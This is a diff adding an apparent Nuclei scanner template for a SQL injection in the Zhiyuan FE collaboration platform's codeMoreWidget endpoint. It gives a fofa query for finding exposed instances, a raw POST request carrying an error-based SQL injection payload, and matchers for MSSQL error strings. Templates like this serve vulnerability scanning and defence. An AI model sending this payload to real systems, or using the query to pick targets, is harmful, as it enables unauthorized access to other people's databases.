@@ -1,0 +1,31 @@
+id: zyhl-codeMoreWidget-sqli
+
+info:
+  name: 致远互联FE协作办公平台-SQL注入-codeMoreWidget
+  author: HuanXiong
+  severity: high
+  metadata: 
+    fofa-query: app="致远互联-FE"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+    - |
+      POST /common/codeMoreWidget.js%70 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Content-Type:application/x-www-form-urlencoded
+      Content-Length:32
+
+      code=1%27AND+2523+IN+%28SELECT+user%29--+kffo
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+    - type: word
+      part: body
+      words:
+      - dbo
+      - nvarchar
+      condition: and
